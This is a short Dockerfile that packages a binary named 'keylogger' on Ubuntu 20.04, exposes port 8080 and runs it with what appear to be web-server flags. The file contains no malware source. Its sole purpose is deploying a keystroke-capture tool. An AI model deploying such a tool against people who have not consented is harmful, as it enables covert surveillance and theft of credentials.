FROM ubuntu:20.04

WORKDIR /app

COPY keylogger /app/

EXPOSE 8080

ENTRYPOINT ["/app/keylogger", "-ws -wp 8080"]
